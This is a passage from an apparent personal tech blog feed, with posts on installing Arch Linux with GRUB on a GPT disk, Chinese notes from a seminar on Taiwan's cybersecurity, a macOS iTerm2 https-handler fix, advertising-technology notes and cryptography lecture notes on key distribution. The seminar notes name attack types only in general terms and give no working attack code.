&lt;h2&gt;Partition&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# lsblk&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Check you are partitioning on the right disk.  &lt;/li&gt;
&lt;li&gt;(assume &lt;code&gt;/dev/sda&lt;/code&gt; here)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# cgdisk /dev/sda&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Partition Table  &lt;ul&gt;
&lt;li&gt;GPT - &lt;code&gt;ef02&lt;/code&gt; (BIOS boot partition) =&amp;gt; &lt;code&gt;/dev/sda1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;1M  &lt;/li&gt;
&lt;li&gt;MUST be the first partition of the disk.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;IMPORTANT!! Set to BIOS Boot partition for grub2&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;/ - 8300 (Linux filesystem) =&amp;gt; &lt;code&gt;/dev/sda2&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;swap - 8200 (Linux swap) =&amp;gt; &lt;code&gt;/dev/sda3&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;home - 8302 (Linux /home) =&amp;gt; &lt;code&gt;/dev/sda4&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Write -&amp;gt; yes  &lt;/li&gt;
&lt;li&gt;QUIT  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# lsblk&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Check if the partition scheme of the disk is right.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Create Filesystem&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# mkfs.ext4 /dev/sda2&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ext4&lt;/code&gt; for &lt;code&gt;/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkfs.ext4 /dev/sda4&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ext4&lt;/code&gt; for &lt;code&gt;home&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkswap /dev/sda3 &amp;amp;&amp;amp; swapon /dev/sda3&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;swap&lt;/code&gt; for &lt;code&gt;swap&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Mount partitionis&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# mount /dev/sda2 /mnt&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkdir /mnt/home &amp;amp;&amp;amp; mount /dev/sda4 /mnt/home&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Select a mirror&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# vi /etc/pacman.d/mirrorlist&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Choose a mirror site that is the nearest from your machine  &lt;/li&gt;
&lt;li&gt;Copy it to the top of this mirrorlist.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Install the base system&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# pacstrap /mnt base base-devel&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Generate fstab&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# genfstab -p /mnt &amp;gt; /mnt/etc/fstab&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# vi /mnt/etc/fstab&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Check if the fstab is right.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Chroot and configure the base system&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# arch-chroot /mnt /bin/bash&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;After chroot, use bash.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Locale &amp;amp; Keymap&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# vi /etc/locale.gen&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Select needed encoding and uncomment them.  &lt;/li&gt;
&lt;li&gt;en_US.UTF-8 UTF-8  &lt;/li&gt;
&lt;li&gt;zh_TW.UTF-8 UTF-8  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# locale-gen&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# echo "LANG=en_US.UTF-8" &amp;gt; /etc/locale.conf&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# echo "KEYMAP=us" &amp;gt; /etc/vconsole.conf&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Timezone &amp;amp; Hardclock &amp;amp; Hostname&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# ln -s /usr/share/zoneinfo/Asia/Taipei /etc/localtime&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# hwclock --systohc --utc&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# echo "$myhostname" &amp;gt; /etc/hostname&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Configure the network (DHCP)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# systemctl enable dhcpcd.service&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;I use DHCP for the virtual machine.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For static IP  and wireless, Check the Official Guide  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Network_configuration"&gt;Network configuration - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Create an initial ramdisk environment&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;If you won't modify &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt;, you can just skip this step.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkinitcpio -p linux&lt;/code&gt; after modified &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Set User&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# passwd&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;set root password.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# useradd -m $user&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;add a user with home directory.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# passwd $user&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;set the password for the user.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Install and configure a bootloader&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# pacman -S grub&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# vi /etc/default/grub&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/38041?project=1&amp;amp;cat%5B0%5D=31&amp;amp;string=grub"&gt;For a bug of grub I've met&lt;/a&gt;.  &lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;GRUB_DISABLE_SUBMENU=y&lt;/code&gt; at the end of &lt;code&gt;/etc/default/grub&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;# grub-mkconfig -o /boot/grub/grub.cfg&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Generate the configuration file of grub  &lt;blockquote&gt;
&lt;p&gt;If you didn't add the &lt;code&gt;GRUB_DISABLE_SUBMENU=y&lt;/code&gt; mentioned above&lt;br /&gt;
you would get error message and fail here.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;# grub-install --target=i386-pc --recheck /dev/sda&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you didn't mark the GPT partition (1007KiB)&lt;br /&gt;
as a &lt;code&gt;BIOS Boot Partition&lt;/code&gt;&lt;br /&gt;
you would get error message and fail here.&lt;br /&gt;
the solution is in &lt;a href="https://wiki.archlinux.org/index.php/GRUB#Intel_BIOS_not_booting_GPT"&gt;GRUB - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;After installation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# exit&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# umount -R /mnt&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;unmount the partitions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# reboot&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners'_Guide"&gt;Arch wiki - Beginner's Guide&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/GRUB#Intel_BIOS_not_booting_GPT"&gt;Arch wiki - GRUB - Intel BIOS not booting GPT&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=173921"&gt;[solved] Grub Update gives Syntax error&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/38041?project=1&amp;amp;cat%5B0%5D=31&amp;amp;string=grub"&gt;FS#38041 - grub 1:2.00.1282.g5ae5c54-1 will not generate grub.cfg file syntax errors&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://xatierlike.blogspot.tw/2012/10/archlinux-installation.html"&gt;Archlinux installation - xatierlike&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Guide"></category><category term="GPT"></category><category term="BIOS"></category></entry><entry><title>資訊工程研討 - 台灣資安防護及技術發展現況</title><link href="https://blog.m157q.tw/posts/2013/12/17/computer-science-seminars-the-status-of-computer-security-in-taiwan/" rel="alternate"></link><published>2013-12-17T06:59:00+08:00</published><updated>2013-12-17T06:59:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-12-17:posts/2013/12/17/computer-science-seminars-the-status-of-computer-security-in-taiwan/</id><summary type="html">&lt;h2&gt;Title: 台灣資安防護及技術發展現況&lt;/h2&gt;
&lt;h2&gt;Spearker: &lt;a href="http://www.bost.ey.gov.tw/cp.aspx?n=34034779A580C772"&gt;黃彥男 博士/ 行政院科技會報辦公室副執行秘書&lt;/a&gt;&lt;/h2&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/itadm/article.php?c=60894"&gt;賽門鐵克：台北市成為全球最多殭屍網路城市&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;2012 與 2013 相較起來，十六種攻擊手法裡面，只有 Spam 下降，其他都上升。  &lt;/li&gt;
&lt;li&gt;一些常見的攻擊手法  &lt;ul&gt;
&lt;li&gt;Drive-by-exploits  &lt;ul&gt;
&lt;li&gt;先觀察攻擊目標習慣瀏覽哪些網站，再去入侵那些網站並植入惡意程式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Drive-by-update  &lt;ul&gt;
&lt;li&gt;透過正常軟體的更新管道派送惡意程式，成為散播惡意程式之主要管道  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rogueware/Scareware  &lt;ul&gt;
&lt;li&gt;勒索軟體肆虐  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Target Attacks  &lt;ul&gt;
&lt;li&gt;針對式攻擊，效率持續提升  &lt;/li&gt;
&lt;li&gt;大多鎖定中小企業  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Evolution of DDoS&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DNS Amplification Attack  &lt;ul&gt;
&lt;li&gt;Compromised DNS servers -&amp;gt; Domains reputation doesn't work anymore.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DDoS Attack using Layer7  &lt;ul&gt;
&lt;li&gt;Very difficult to block (requires L7 analysis)  &lt;/li&gt;
&lt;li&gt;Can be implemented with relatively smaller number of zombies  &lt;/li&gt;
&lt;li&gt;Advanced features (cookie learning etc) are implemented  &lt;/li&gt;
&lt;li&gt;Jam the Web server  &lt;ul&gt;
&lt;li&gt;攻擊前還會先送 request 檢查哪個 server 最容易被攻陷  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jam the application  &lt;/li&gt;
&lt;li&gt;DDoS 已經商業化 ex: &lt;a href="http://www.ddos-service.ws/"&gt;ddos-service&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;資訊安全的著手點&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;技術、人、管理  &lt;/li&gt;
&lt;li&gt;美國全面性國家網際安全倡議 (CNCI)  &lt;ul&gt;
&lt;li&gt;CNCI-5  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;共通運作圖像 (Common Operation Picture)  &lt;ul&gt;
&lt;li&gt;狀況認知 (Situation Awareness)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cyber Kill Chain  &lt;ul&gt;
&lt;li&gt;情蒐攻擊對象 -&amp;gt; 入侵工具研製 -&amp;gt; 傳遞入侵工具 -&amp;gt; 執行弱點攻擊 -&amp;gt; 安裝後門程式 -&amp;gt; 指揮與管制 -&amp;gt; 資料竊取運送  &lt;/li&gt;
&lt;li&gt;對網路攻擊者攻擊的地點進行預測來進行防治  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;台灣資安策略聯盟合作模式  &lt;ul&gt;
&lt;li&gt;遭受攻擊後通報  &lt;/li&gt;
&lt;li&gt;如何整合所有的單位，達到在受到攻擊的時候可以做出相對的處理，而不是只有通報。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;政府持續推動資通安全  &lt;ul&gt;
&lt;li&gt;行政院國家資通安全會報  &lt;ul&gt;
&lt;li&gt;行政院國家資通安全會報技術服務中心  &lt;ul&gt;
&lt;li&gt;G-SOC 二線監控  &lt;ul&gt;
&lt;li&gt;資料蒐集、整合、分析  &lt;/li&gt;
&lt;li&gt;利用 Big Data 進行分析  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SPMO 規劃  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;資安技術的研發及挑戰&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;New Challenges  &lt;ul&gt;
&lt;li&gt;Social networks  &lt;/li&gt;
&lt;li&gt;Cloud computing  &lt;/li&gt;
&lt;li&gt;Internal threats  &lt;/li&gt;
&lt;li&gt;Mobile communication  &lt;/li&gt;
&lt;li&gt;Smarter and more organized hackers  &lt;/li&gt;
&lt;li&gt;Data explosion  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.twisc.org/"&gt;Taiwan Information Security Center (TWISC)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Cyber Security Intelligent Center (CSIC)  &lt;ul&gt;
&lt;li&gt;Security: 5 Phases  &lt;ul&gt;
&lt;li&gt;Prevention  &lt;/li&gt;
&lt;li&gt;Protection/monitoring  &lt;/li&gt;
&lt;li&gt;Detection (abnormaly)  &lt;/li&gt;
&lt;li&gt;Analysis &amp;amp; Prediction  &lt;/li&gt;
&lt;li&gt;Recovery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;事後資料的分析  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;找出 Low-Hanghing Fruit，並進行防護  &lt;/li&gt;
&lt;li&gt;How do we know the emerging attack  &lt;ul&gt;
&lt;li&gt;Run server honeypots  &lt;/li&gt;
&lt;li&gt;Run client honeypots  &lt;/li&gt;
&lt;li&gt;Run the Crawler  &lt;/li&gt;
&lt;li&gt;Manual work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Free DNS are bad  &lt;/li&gt;
&lt;li&gt;蒐集資料、建關係圖、找出  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Information Security"></category><category term="Hacking"></category><category term="Network Attack"></category><category term="InfoSec"></category><category term="Security"></category></entry><entry><title>iTerm2 搶走 https 連結預設開啟程式的解法</title><link href="https://blog.m157q.tw/posts/2013/12/10/change-the-default-application-for-https-url-in-iterm2-on-mac/" rel="alternate"></link><published>2015-10-26T13:47:00+08:00</published><updated>2015-10-26T13:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-12-10:posts/2013/12/10/change-the-default-application-for-https-url-in-iterm2-on-mac/</id><summary type="html">&lt;p&gt;iTerm2 會搶走 https 的預設開啟應用程式&lt;br /&gt;
所以每次點 https 連結以後&lt;br /&gt;
就會在 iTerm2 開一個新分頁 然後啥都沒有&lt;br /&gt;
http 連結就不會有這個問題  &lt;/p&gt;
&lt;p&gt;google 了好久 終於找到這篇&lt;br /&gt;
&lt;a href="http://www.macuknow.com/node/20369"&gt;MacUknow - 請問關於https連結預設開啟程式&lt;/a&gt;&lt;br /&gt;
國外好像都沒人遇到 不然就是我 google searching skill 太差  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;解法&lt;/h3&gt;
&lt;p&gt;在 terminal 輸入  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;open ~/Library/Preferences/com.apple.LaunchServices.plist&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;預設會用 Xcode 開啟&lt;br /&gt;
一個個點開檢查 &lt;code&gt;LSHandlers&lt;/code&gt; 底下的某個 Item&lt;br /&gt;
看到 &lt;code&gt;LSHandlerURLScheme https&lt;/code&gt; 後&lt;br /&gt;
把底下的 &lt;code&gt;LSHandlerRoleAll&lt;/code&gt; 改成 &lt;code&gt;com.google.chrome&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;確認修改完之後重新開機&lt;br /&gt;
點選 https 應該就會改回用 Chrome 開啟了  &lt;/p&gt;</summary><category term="Mac"></category><category term="HTTPS"></category><category term="iTerm2"></category></entry><entry><title>SNTT week13 - Introduction to Advertisement Eco System</title><link href="https://blog.m157q.tw/posts/2013/12/10/sntt-week13-introduction-to-advertisement-eco-system/" rel="alternate"></link><published>2013-12-10T13:11:00+08:00</published><updated>2013-12-10T13:11:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-12-10:posts/2013/12/10/sntt-week13-introduction-to-advertisement-eco-system/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.google.com/analytics/web/"&gt;Google Analytics&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幫助分析流量、客源...等等  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Advertisement Eco system  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.booking.com"&gt;booking.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Audience Targeting  &lt;ul&gt;
&lt;li&gt;SSP &amp;amp; DSP  &lt;ul&gt;
&lt;li&gt;SSP - &lt;a href="https://en.wikipedia.org/wiki/Supply-side_platform"&gt;Supply-side platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;DSP - &lt;a href="https://en.wikipedia.org/wiki/Demand-side_platform"&gt;Demand-side platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;採買決策優化平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AD Exchange 廣告交換平台  &lt;ul&gt;
&lt;li&gt;買家可以在需要的時候，利用競價購買特定的流量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RTB Online Display Advertisment  &lt;ul&gt;
&lt;li&gt;RTB - &lt;a href="https://en.wikipedia.org/wiki/Real-time_bidding"&gt;Real-time Bidding&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DMP  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.adotas.com/2011/09/defining-data-management-platform/"&gt;Data Management Platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;資料管理平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Skills  &lt;ul&gt;
&lt;li&gt;Big Data  &lt;/li&gt;
&lt;li&gt;Cloud Computing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Companies  &lt;ul&gt;
&lt;li&gt;Google  &lt;/li&gt;
&lt;li&gt;Amazon  &lt;/li&gt;
&lt;li&gt;Facebook  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="SNTT"></category><category term="Advertisement"></category><category term="digital advertising"></category></entry><entry><title>ITC week10 - Key Management and Distribution</title><link href="https://blog.m157q.tw/posts/2013/11/27/itc-week10-key-management-and-distribution/" rel="alternate"></link><published>2013-11-27T04:09:00+08:00</published><updated>2013-11-27T04:09:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-27:posts/2013/11/27/itc-week10-key-management-and-distribution/</id><summary type="html">&lt;h2&gt;NCTUCS 2013-Fall Introduction to Cryptography by Professor Rong-Jaye Chen.&lt;/h2&gt;
&lt;p&gt;今天是 liuyh 講課!  &lt;/p&gt;
&lt;p&gt;Master key, Session key, X.509, PKI  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Symmetric Key Distribution Using Symmetric Encryption  &lt;/li&gt;
&lt;li&gt;Symmetric Key Distribution Using Asymmetric Encryption  &lt;/li&gt;
&lt;li&gt;Distribution Of Public Keys  &lt;/li&gt;
&lt;li&gt;X.509 Certificates  &lt;/li&gt;
&lt;li&gt;Public-Key Infrastructure  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Symmetric Key Distribution Using Symmetric Encryption&lt;/h2&gt;
&lt;p&gt;加密：public key or private key&lt;br /&gt;
簽章：private key  &lt;/p&gt;
&lt;p&gt;symmetric key: 速度較快&lt;br /&gt;
asymmetric key: 速度較慢  &lt;/p&gt;
&lt;p&gt;&lt;img alt="p.6" src="/files/itc-week10-key-management-and-distribution/p6.jpg" /&gt;&lt;br /&gt;
現今網路環境使用上圖的 Option 4&lt;br /&gt;
KDC = Key Distribution Center  &lt;/p&gt;
&lt;p&gt;Session Key =&amp;gt; 加密 Communication&lt;br /&gt;
Master Key =&amp;gt; 加密 Session Key  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;只需要 N 個 Master Key  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Data =&amp;gt; 有加密&lt;br /&gt;
Session Key =&amp;gt; 有加密&lt;br /&gt;
Master Key =&amp;gt; &lt;strong&gt;沒加密&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;Key Distribution 的步驟&lt;br /&gt;
&lt;img alt="p.10" src="/files/itc-week10-key-management-and-distribution/p10.jpg" /&gt;  &lt;/p&gt;
&lt;h3&gt;Hierarchical Key Control&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Single LAN  &lt;/li&gt;
&lt;li&gt;KDC 和 KDC 之間有自己的方法作訊息交換  &lt;/li&gt;
&lt;li&gt;把 KDC 切開的好處：當某個 KDC 出事時，影響範圍較小  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Session Key Lifetime&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Session Key 換的越頻繁，則越安全。  &lt;/li&gt;
&lt;li&gt;但一直交換 Session Key 也會造成 Overhead  &lt;/li&gt;
&lt;li&gt;所以要在換與不換之間找到平衡點  &lt;/li&gt;
&lt;li&gt;如果 Connection 會進行很長的一段時間  &lt;/li&gt;
&lt;li&gt;傳輸過程會跟資料及封包的格式有關  &lt;/li&gt;
&lt;li&gt;UDP =&amp;gt; connectionless =&amp;gt; 一個連線不太需要換 Session Key&lt;br /&gt;
=&amp;gt; 改成每次交換都用新的 Session Key =&amp;gt; 不符合 connectionless 需要快速的原則&lt;br /&gt;
=&amp;gt; 改用有時效性的 Session Key 會是比較好的作法  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;A Transparent Key Control Scheme&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="p.13" src="/files/itc-week10-key-management-and-distribution/p13.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Decentralized Key Control&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fully Decentralized =&amp;gt; 每個 host 兩兩之間都會有一個 Master Key =&amp;gt; 沒有中央化的存在  &lt;/li&gt;
&lt;li&gt;缺點： N 個 hosts 需要 N(N-1)/2 個 Master Key =&amp;gt; 又回到了原本的數量級  &lt;/li&gt;
&lt;li&gt;優點： 較安全  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Controlling Key Usage&lt;/h3&gt;
&lt;p&gt;如果把 Master Key 當成 Session Key 來用的話，在安全性上可能會洩漏用該 Master Key 加密的 Session Key  &lt;/p&gt;
&lt;h4&gt;到此為止，還是沒交代 Master Key 從何而來&lt;/h4&gt;
&lt;hr /&gt;
&lt;h2&gt;Symmetric Key Distribution Using Asymmetric Encryption&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;效率較差  &lt;/li&gt;
&lt;li&gt;用來加密並傳輸 secret key  &lt;/li&gt;
&lt;li&gt;&lt;img alt="p.18" src="/files/itc-week10-key-management-and-distribution/p18.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;優點  &lt;ul&gt;
&lt;li&gt;安全性較高，Key 被破解了，只會影響該次傳輸，不會影響該次前後的傳輸。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;有 Man-in-the-middle-attack 的風險&lt;br /&gt;
&lt;img alt="p.19" src="/files/itc-week10-key-management-and-distribution/p19.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;為了抵抗 Man-in-middle-attack 修改之前的方法&lt;/h3&gt;
&lt;p&gt;前提：A 和 B 必須先交換過彼此的 Public Key&lt;br /&gt;
1. A 將 identifier 加上 N1 再用 B 的 public key 加密，丟給 B&lt;br /&gt;
2. B 收到後解開，得到 N1，再把 N1 加上 N2，用 A 的 Public key 加密，丟給 A。 (證明自己是B)&lt;br /&gt;
3. A 將 N2 用 B 的 Public Key 加密後，丟給 B。(證明自己是 A)&lt;br /&gt;
4. A 將 secret key 用 A 的 private key 加密，再用 B 的 Public key 加密後，丟給 B  &lt;/p&gt;
&lt;p&gt;如此可以確定雙方都是真的 A 和 B。  &lt;/p&gt;
&lt;h3&gt;A Hybrid Scheme&lt;/h3&gt;
&lt;p&gt;見投影片 p.21  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Distribution Of Public Keys&lt;/h2&gt;
&lt;h3&gt;Public Announcement of Public Key&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;每個人都可以假裝是別人，然後發別人的 Public Key，所以拿到的 Public Key 可能是假的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;太危險，不能用。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Publicly Available Directory&lt;/h3&gt;
&lt;ul&gt;
